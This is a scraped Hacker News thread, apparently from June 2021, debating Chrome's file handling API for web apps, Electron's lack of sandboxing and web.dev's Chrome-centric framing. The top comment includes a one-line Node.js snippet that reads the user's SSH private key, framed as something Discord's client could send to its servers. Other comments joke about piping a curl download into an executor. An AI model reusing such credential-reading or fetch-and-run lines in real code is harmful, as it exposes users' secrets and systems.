+            Here&#x27;s a web app that compromises your SSH private key: use the discord client in chromium.<p>Their electron client is literally a remote administration toolkit, it has full access to FS (electron app) and it loads every script from their servers. On launch the desktop client opens websocket server for command and control listening.<p>They can just add something like require(&#x27;fs&#x27;).readFileSync(process.env.HOME + &#x27;&#x2F;.ssh&#x2F;id_rsa&#x27;).toString() and send this to their servers, and you won&#x27;t even notice that (since it doesn&#x27;t require an update on client because the client is just a browser with full permissions that loads obfuscated code from their servers every time you launch it).
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=danShumway" target="_blank">danShumway</a>   <span class="timeago" data-date="2021-06-14 15:00:18 &#43;0000 UTC">2021-06-14 15:00:18 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Electron is basically a framework for native apps, they&#x27;re only &quot;web&quot; apps in architecture and language choice. They have all of the same permissions as native apps and basically zero sandboxing. They&#x27;re frequently extended using low-level code. They can call out to system libraries.<p>For the scope of the current conversation, Electron apps can <i>already</i> be file handlers on every single desktop platform, so we&#x27;re pretty clearly not talking about Electron when we critique these new web standards. Electron doesn&#x27;t care about your opinion of web standards or what is or isn&#x27;t getting fast-tracked in Chrome, Electron can already do whatever it wants.<p>That&#x27;s not to say that Electron&#x27;s lack of sandboxing isn&#x27;t a problem, it absolutely is. But it&#x27;s just not really relevant to what we&#x27;re talking about right now, and it&#x27;s a problem that almost every native app platform shares with Electron.<p>One of the goals with introducing newer &quot;riskier&quot; standards on the web is to get an application platform that does have sandboxing -- it&#x27;s to be able to use Electron and other unsandboxed apps for fewer things. Whether that&#x27;s a <i>good</i> goal I&#x27;m not going to comment on; different people have different opinions on the direction of the web as an app platform and whether it&#x27;s smart for Google to be breaking all these holes in an otherwise decent sandbox. But regardless, Electron is not the web.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=michael-ax" target="_blank">michael-ax</a>   <span class="timeago" data-date="2021-06-14 14:33:43 &#43;0000 UTC">2021-06-14 14:33:43 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            &gt;the discord client in chromium.<p>running in-browser is not the same as installing their electron client.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=geofft" target="_blank">geofft</a>   <span class="timeago" data-date="2021-06-14 14:55:17 &#43;0000 UTC">2021-06-14 14:55:17 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Not sure I follow. The following certainly does not work:<p>1. Install Chromium from <a href="https:&#x2F;&#x2F;www.chromium.org&#x2F;" rel="nofollow">https:&#x2F;&#x2F;www.chromium.org&#x2F;</a><p>2. Go to <a href="https:&#x2F;&#x2F;discord.com&#x2F;" rel="nofollow">https:&#x2F;&#x2F;discord.com&#x2F;</a> and click &quot;Open Discord in your browser&quot;<p>3. Discord can read files from ~&#x2F;.ssh<p>You mention &quot;Electron,&quot; but Electron is a local application. So it doesn&#x27;t satisfy my request, which is that I want you to steal my SSH private key when I visit a website in a web browser.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=" target="_blank"></a>   <span class="timeago" data-date="2021-06-14 16:27:54 &#43;0000 UTC">2021-06-14 16:27:54 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=" target="_blank"></a>   <span class="timeago" data-date="2021-06-14 14:08:58 &#43;0000 UTC">2021-06-14 14:08:58 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=xaduha" target="_blank">xaduha</a>   <span class="timeago" data-date="2021-06-14 13:42:01 &#43;0000 UTC">2021-06-14 13:42:01 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Thought it was already possible since PDF files can be opened by modern browsers just fine. But recently tried making Google Sheets open XLS files via some 3rd party plugin, no luck.<p>Surprised Google didn&#x27;t whip out something proprietary, since Google Docs was added 15 years ago, way before official drag and drop support too. Didn&#x27;t Google Desktop allow that at some point?
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=twobitshifter" target="_blank">twobitshifter</a>   <span class="timeago" data-date="2021-06-14 13:51:30 &#43;0000 UTC">2021-06-14 13:51:30 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            I’m surprised too - chromeos must have file handling right?
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=skybrian" target="_blank">skybrian</a>   <span class="timeago" data-date="2021-06-14 14:22:42 &#43;0000 UTC">2021-06-14 14:22:42 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            It was previously handled via (Chrome-only) extension apis [1].<p>But that is deprecated in favor of regular web apps having access via a regular browser API. There is potential for it to become a web standard, if other browsers go along. It’s too early to tell.<p>Extensions are less secure. As we’ve seen they have too many permissions and ownership can be transferred. They were also inherently Chrome-only, though there seem to be some efforts to standardize api’s these days.<p>But if this new api goes through, it opens an interesting security... situation where the ownership of a <i>web app</i> gets transferred and it automatically updates, so now opening a file does something else.<p>This is true of automatic updates in general. Automatic updates are the cause of and solution to many problems.<p>[1] <a href="https:&#x2F;&#x2F;developer.chrome.com&#x2F;docs&#x2F;extensions&#x2F;reference&#x2F;fileSystem&#x2F;" rel="nofollow">https:&#x2F;&#x2F;developer.chrome.com&#x2F;docs&#x2F;extensions&#x2F;reference&#x2F;fileS...</a>
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=hvasilev" target="_blank">hvasilev</a>   <span class="timeago" data-date="2021-06-14 14:39:01 &#43;0000 UTC">2021-06-14 14:39:01 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            This looks like an API that is a bug away from allowing a website to have full access to everything on your file system.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=est" target="_blank">est</a>   <span class="timeago" data-date="2021-06-14 16:02:05 &#43;0000 UTC">2021-06-14 16:02:05 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Is it too late to push the idea of &quot;files&quot; in today&#x27;s mobile Internet world? I mean most web content are locked in walled gardens they are not copypastable nor tranferable. Not even editable in a &quot;file&quot; way.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=dirkc" target="_blank">dirkc</a>   <span class="timeago" data-date="2021-06-14 16:49:21 &#43;0000 UTC">2021-06-14 16:49:21 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            I read the title and for a moment I got excited and thought, that&#x27;s a good idea, what if using a website was like using a program that operates on a file with all my data in there and next time I want to use the site I need to open my file before I can do anything.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=denton-scratch" target="_blank">denton-scratch</a>   <span class="timeago" data-date="2021-06-14 14:13:26 &#43;0000 UTC">2021-06-14 14:13:26 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Wy is web.dev&#x27;s whois REDACTED FOR PRIVACY? Is Google ashamed of it? Or does someone else own it?
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=ourcat" target="_blank">ourcat</a>   <span class="timeago" data-date="2021-06-14 14:26:29 &#43;0000 UTC">2021-06-14 14:26:29 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            I think this is fairly standard practice these days, depending on the location of the registrar. (eg: EU)
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=nynx" target="_blank">nynx</a>   <span class="timeago" data-date="2021-06-14 13:11:36 &#43;0000 UTC">2021-06-14 13:11:36 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            This is great. I&#x27;m a big fan of how powerful web applications are getting.<p>Speaking of powerful web apps, I wonder if we&#x27;ll see support for registering web apps as commands that can be run in a terminal.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=pjmlp" target="_blank">pjmlp</a>   <span class="timeago" data-date="2021-06-14 13:36:31 &#43;0000 UTC">2021-06-14 13:36:31 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            With Chrome taking over the Web, ultimatly you will get ChromeOSification of the Web.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=zozbot234" target="_blank">zozbot234</a>   <span class="timeago" data-date="2021-06-14 13:39:36 &#43;0000 UTC">2021-06-14 13:39:36 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            <p><pre><code>   curl https:&#x2F;&#x2F;URI_TO_WEB_APP | wasm-exec-webapp &#x2F;dev&#x2F;stdin</code></pre>
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=moehm" target="_blank">moehm</a>   <span class="timeago" data-date="2021-06-14 13:50:56 &#43;0000 UTC">2021-06-14 13:50:56 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            This sounds so incredible dangerous, OTOH there is no difference to curl | sh.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=nynx" target="_blank">nynx</a>   <span class="timeago" data-date="2021-06-14 14:06:58 &#43;0000 UTC">2021-06-14 14:06:58 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            While `wasm-exec-webapp` isn&#x27;t a real thing, if it&#x27;s sandboxed as it would be, there&#x27;d be no difference, security wise, between that and going to a webpage in your browser
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=mike_ivanov" target="_blank">mike_ivanov</a>   <span class="timeago" data-date="2021-06-14 17:33:07 &#43;0000 UTC">2021-06-14 17:33:07 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Remember ActiveX?
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=Spivak" target="_blank">Spivak</a>   <span class="timeago" data-date="2021-06-14 14:14:25 &#43;0000 UTC">2021-06-14 14:14:25 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            I mean when you navigate to any website you’re basically doing curl | v8 and trusting that the sandbox works.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=ferdowsi" target="_blank">ferdowsi</a>   <span class="timeago" data-date="2021-06-14 13:35:45 &#43;0000 UTC">2021-06-14 13:35:45 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            This is very neat. Looking forward to ICS files actually being useful again!
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=dmitriid" target="_blank">dmitriid</a>   <span class="timeago" data-date="2021-06-14 13:53:02 &#43;0000 UTC">2021-06-14 13:53:02 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            To quote and paraphrase Rich Harris, creator of Svelte [1]:<p>=== quote and paraphrase ===<p>What is missing is signals from other browser implementors. Until this info is included prominently at the top of every web.dev article, it will be seen as biased and uninformative. when you say &quot;you can do this <i>today</i>&quot;, you&#x27;re knowingly encouraging people to build chrome sites instead of websites!<p>These are often just drafts created and authored by Googlers, and nothing in the web.dev articles even mentions that.<p>web.dev presents itself (through its domain name, inconspicuous Google branding, etc) as a neutral resource for web developers. It&#x27;s not. By not making its Chrome-centric nature clear, you&#x27;re actively making it harder for web developers to get good, unbiased info.<p>=== end quote and paraphrase  ===<p>For example, the article claims that &quot;web apps are capable of reading and writing files&quot;. No, they are not.<p>It&#x27;s sort of charitable to say that there&#x27;s &quot;no signal&quot; from either Safari or Firefox on File System APIs [2] and on File Handling APIs [3]. However, web.dev presents this as fait accompli and expect droves of &quot;omg Safari stifles innovation on the web&quot; on HN.<p>Whereas it&#x27;s Google ramming incomplete drafts of Chrome-only internal APIs through standards bodies and enabling them by default in Chrome.<p>[1]<p><a href="https:&#x2F;&#x2F;twitter.com&#x2F;Rich_Harris&#x2F;status&#x2F;1399025469559914496" rel="nofollow">https:&#x2F;&#x2F;twitter.com&#x2F;Rich_Harris&#x2F;status&#x2F;1399025469559914496</a> and then <a href="https:&#x2F;&#x2F;twitter.com&#x2F;Rich_Harris&#x2F;status&#x2F;1399043615280746497" rel="nofollow">https:&#x2F;&#x2F;twitter.com&#x2F;Rich_Harris&#x2F;status&#x2F;1399043615280746497</a><p>[2] <a href="https:&#x2F;&#x2F;www.chromestatus.com&#x2F;feature&#x2F;6284708426022912" rel="nofollow">https:&#x2F;&#x2F;www.chromestatus.com&#x2F;feature&#x2F;6284708426022912</a><p>[3] <a href="https:&#x2F;&#x2F;www.chromestatus.com&#x2F;feature&#x2F;5721776357113856" rel="nofollow">https:&#x2F;&#x2F;www.chromestatus.com&#x2F;feature&#x2F;5721776357113856</a>
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=lioeters" target="_blank">lioeters</a>   <span class="timeago" data-date="2021-06-14 14:26:48 &#43;0000 UTC">2021-06-14 14:26:48 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            &gt; It&#x27;s sort of charitable to say that there&#x27;s &quot;no signal&quot; from either Safari or Firefox on File System APIs<p>I agree the phrase &quot;no signal&quot; does not accurately communicate other browser vendors&#x27; position.<p>Mozilla&#x27;s current position on File System API is &quot;defer&quot;.<p>&gt; The ability to read and write from the filesystem is potentially very dangerous. We will need to carefully consider any solution in light of the security and privacy implications.<p>&gt; We recognize that the spec authors take this issue seriously, but we are concerned that any solution will increase the risk of security incidents more than we are willing to tolerate. Right now, there isn&#x27;t enough detail in the specification to make an assessment of these risks, so we will defer our decision until we have more information.<p><a href="https:&#x2F;&#x2F;mozilla.github.io&#x2F;standards-positions&#x2F;#native-file-system" rel="nofollow">https:&#x2F;&#x2F;mozilla.github.io&#x2F;standards-positions&#x2F;#native-file-s...</a><p>..And Safari&#x27;s position:<p>&gt; Apple&#x27;s WebKit team does not support this feature due to the security &#x2F; safety concerns.<p><a href="https:&#x2F;&#x2F;lists.webkit.org&#x2F;pipermail&#x2F;webkit-dev&#x2F;2020-August&#x2F;031362.html" rel="nofollow">https:&#x2F;&#x2F;lists.webkit.org&#x2F;pipermail&#x2F;webkit-dev&#x2F;2020-August&#x2F;03...</a>
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=zozbot234" target="_blank">zozbot234</a>   <span class="timeago" data-date="2021-06-14 14:30:13 &#43;0000 UTC">2021-06-14 14:30:13 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Webapps can <i>load</i> and <i>save</i> files by explicitly prompting the user. This works in every browser. Random file or directory access is not provided for by existing standards, but simple load and save are enough for many use cases.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=Leherenn" target="_blank">Leherenn</a>   <span class="timeago" data-date="2021-06-14 15:18:47 &#43;0000 UTC">2021-06-14 15:18:47 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Not every browser, you can&#x27;t save a file on iOS 12 (well only to iCloud, and you can&#x27;t name them).
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=" target="_blank"></a>   <span class="timeago" data-date="2021-06-14 13:45:47 &#43;0000 UTC">2021-06-14 13:45:47 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=withinboredom" target="_blank">withinboredom</a>   <span class="timeago" data-date="2021-06-14 13:36:55 &#43;0000 UTC">2021-06-14 13:36:55 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            So if I open a 2g file in a web app, I have to upload 2g?
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=haxiomic" target="_blank">haxiomic</a>   <span class="timeago" data-date="2021-06-14 13:39:14 &#43;0000 UTC">2021-06-14 13:39:14 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            The file doesn&#x27;t need to be uploaded for it to be edited within a web app – everything can be 100% local, including saving editor state (through local-storage).<p>The only network access absolutely necessary is downloading the web app code initially but after first load it&#x27;s possible for a web app to work offline
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=skybrian" target="_blank">skybrian</a>   <span class="timeago" data-date="2021-06-14 14:02:17 &#43;0000 UTC">2021-06-14 14:02:17 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            No, as I understand it the file is local and the JavaScript is also running locally in a browser sandbox. Also, the file is accessed in the usual way by opening it and reading from it. (There is a File System Access API that lets you get a FileSystemFileHandle and do random access.)<p>You could write an uploader that sends the file over the network, or handle it entirely locally.<p>It all seems to be Chrome only for now.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=yathern" target="_blank">yathern</a>   <span class="timeago" data-date="2021-06-14 13:42:04 &#43;0000 UTC">2021-06-14 13:42:04 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Nope. The file data is open within the browser context, and from there the app can decide what to do with it - which may entail uploading it, but doesn&#x27;t need to be. The same way you can open a file in photopea.com without uploading it to their servers.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=jerrygoyal" target="_blank">jerrygoyal</a>   <span class="timeago" data-date="2021-06-14 13:23:44 &#43;0000 UTC">2021-06-14 13:23:44 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            eagerly waiting for squoosh app (wasm) to add context menu option to compress selected image(s).
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=kinlan" target="_blank">kinlan</a>   <span class="timeago" data-date="2021-06-14 13:26:00 &#43;0000 UTC">2021-06-14 13:26:00 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            I&#x27;ve just pinged the team. :)
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=worble" target="_blank">worble</a>   <span class="timeago" data-date="2021-06-14 13:47:16 &#43;0000 UTC">2021-06-14 13:47:16 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            This is kind of meta, but what exactly is this site? Roaming around, it appears to be a bunch of blog posts written by the Chromium&#x2F;Google team (except for one article I found which was written by a developer for The Telegraph). It&#x27;s not exactly <i>hiding</i> it&#x27;s association, I mean it&#x27;s right there in the footer, but why isn&#x27;t this under some kind of chromium or google url so the association is immediately obvious, or at least mentioned in the About page?<p>At the risk of sounding conspiratorial, it feels like they&#x27;re trying to hide in plain sight, pushing Chrome only features while constantly just saying &quot;mordern web&quot;, and while they pay passing mention that the API is &quot;currently in development&quot; it doesn&#x27;t add the fact it is not standardised, and it likely won&#x27;t be coming to Firefox at all, as they consider it harmful: <a href="https:&#x2F;&#x2F;github.com&#x2F;mozilla&#x2F;standards-positions&#x2F;issues&#x2F;154#issuecomment-668923566" rel="nofollow">https:&#x2F;&#x2F;github.com&#x2F;mozilla&#x2F;standards-positions&#x2F;issues&#x2F;154#is...</a>
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=berniemadoff69" target="_blank">berniemadoff69</a>   <span class="timeago" data-date="2021-06-14 18:00:22 &#43;0000 UTC">2021-06-14 18:00:22 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            it seems fitting to me that a Google-ran blog about &#x27;web development&#x27; in 2021 would look like this: <a href="https:&#x2F;&#x2F;i.imgur.com&#x2F;XpyBoMR.png" rel="nofollow">https:&#x2F;&#x2F;i.imgur.com&#x2F;XpyBoMR.png</a>
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=EMM_386" target="_blank">EMM_386</a>   <span class="timeago" data-date="2021-06-14 13:49:18 &#43;0000 UTC">2021-06-14 13:49:18 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            &gt; At the risk of sounding conspiratorial, it feels like they&#x27;re trying to hide in plain sight, pushing Chrome only features<p>I don&#x27;t think that&#x27;s too conspiratorial, I think that&#x27;s exactly what is going on here.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=amarshall" target="_blank">amarshall</a>   <span class="timeago" data-date="2021-06-14 14:24:59 &#43;0000 UTC">2021-06-14 14:24:59 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Yup, Google using its powerful position to make it seem like the generic owner of things when it is not. See also the sites: doc.new, docs.new, document.new, sheet.new, sheets.new, spreadsheet.new, slide.new, slides.new, deck.new, presentation.new, form.new, forms.new, site.new, sites.new, website.new, and probably others.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=judge2020" target="_blank">judge2020</a>   <span class="timeago" data-date="2021-06-14 14:58:42 &#43;0000 UTC">2021-06-14 14:58:42 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            <a href="https:&#x2F;&#x2F;whats.new&#x2F;shortcuts&#x2F;" rel="nofollow">https:&#x2F;&#x2F;whats.new&#x2F;shortcuts&#x2F;</a><p>A bunch of other sites have also &#x27;claimed&#x27; some .new domains, like vue.new goes to codesandbox.io and api.new to RunKit.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=ocdtrekkie" target="_blank">ocdtrekkie</a>   <span class="timeago" data-date="2021-06-14 15:16:20 &#43;0000 UTC">2021-06-14 15:16:20 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Sure, but since Google owns .new, they had first dibs on grabbing every generic document type they could possibly want. Sure, Microsoft can grab word.new, but doc.new is Google&#x27;s regardless of what you use to write documents.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=amarshall" target="_blank">amarshall</a>   <span class="timeago" data-date="2021-06-14 15:33:34 &#43;0000 UTC">2021-06-14 15:33:34 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Likewise, Google owns .dev.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=skybrian" target="_blank">skybrian</a>   <span class="timeago" data-date="2021-06-14 15:06:15 &#43;0000 UTC">2021-06-14 15:06:15 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            The question is what Google should do if they need a new web API badly enough to implement it.<p>Making it clear that it’s Chrome only (for now) would be good  and they should do that more prominently. Making it possible for other browsers to implement by designing it with standardization in mind also seems good? (Unlike the situation with web extensions.) Lock-in is bad, Chrome-only websites are bad, so they should be trying to standardize things and avoid using it as a point of differentiation between browsers.<p>Not speaking for other browser vendors is also good. Like, it’s all very well for us to say that Firefox seems unlikely to pick it up, but someone on the Chrome team should <i>definitely not say that</i>, because it jinxes the effort and Firefox might change their minds if web developers seem to want it. (The comment you link to raises security concerns but I don’t think they claim to be giving the final word about Firefox’s position.)<p>So we see the state of standardization a bit hidden behind euphemisms like saying that there are “no signals” from other browsers yet.<p>There’s also the danger of having early articles become out of date by claiming that things are Chrome-only when actually the situation has changed and the person writing the article doesn’t know about it, so there is a tendency to avoid saying too much.<p>The underlying assumption is that web standards evolve by browser vendors starting to implement things ahead of getting consensus. Implementation and documentation start ahead of the standardization effort, which goes on in parallel.<p>(And underlying that assumption is the notion that rapid adoption of more powerful web api’s is desirable and “stagnation” is bad. Safari gets a lot of grief for being too slow, while Chrome gets grief for being too fast.)
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=ocdtrekkie" target="_blank">ocdtrekkie</a>   <span class="timeago" data-date="2021-06-14 15:14:15 &#43;0000 UTC">2021-06-14 15:14:15 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            &gt; Safari gets a lot of grief for being too slow<p>Literally mostly from Google employees just mad their pet project doesn&#x27;t work on iOS. I, and plenty of others, appreciate the position Safari (and sometimes Firefox) holds in only supporting web APIs that provide value greater than the security and privacy risks they introduce.<p>Google&#x27;s busy trying to invent ways for websites to tamper with your USB devices, and it hasn&#x27;t even managed to deal with how much malware it distributes through it&#x27;s extension store alone, much less through it&#x27;s ad platform and misuse of the notifications API.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=skybrian" target="_blank">skybrian</a>   <span class="timeago" data-date="2021-06-14 15:32:35 &#43;0000 UTC">2021-06-14 15:32:35 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            You might be a little biased if you think Google is trying to tamper with your USB devices.<p>You’re also trying to put <i>yourself</i> in a position of speaking for other developers, which is something we should avoid. How do we know what most developers want?
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=ocdtrekkie" target="_blank">ocdtrekkie</a>   <span class="timeago" data-date="2021-06-14 16:16:54 &#43;0000 UTC">2021-06-14 16:16:54 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            &gt; You might be a little biased if you think Google is trying to tamper with your USB devices.<p>That is not what I said. I said they are trying to let websites tamper with your USB devices. Aka, they introduced WebUSB, yet another mostly-useless browser feature that exposes a large attack area to the web which I need to block by policy, that was probably solely introduced so they could release <a href="https:&#x2F;&#x2F;flash.android.com&#x2F;" rel="nofollow">https:&#x2F;&#x2F;flash.android.com&#x2F;</a> which very few people need or use, and could just as well be a desktop app.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=skybrian" target="_blank">skybrian</a>   <span class="timeago" data-date="2021-06-14 17:01:13 &#43;0000 UTC">2021-06-14 17:01:13 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            It does create some interesting security implications that I hope get addressed properly. But I think you are not seeing its potential.<p>As someone who dabbles with Arduino I actually do want USB support. I don’t particularly like installing everything but the kitchen sink on my desktop via homebrew just to get a decent development environment going. (Last time I tried it, the Python install failed because homebrew doesn’t support the OS version I’m running. I really dislike homebrew.)<p>Running embedded development in a browser and just giving access to a certain USB device would be an improvement, letting you do it on any machine or even a Chromebook. It’s going to take a long time to get there but I can see it being useful someday.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=ocdtrekkie" target="_blank">ocdtrekkie</a>   <span class="timeago" data-date="2021-06-14 17:20:54 &#43;0000 UTC">2021-06-14 17:20:54 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
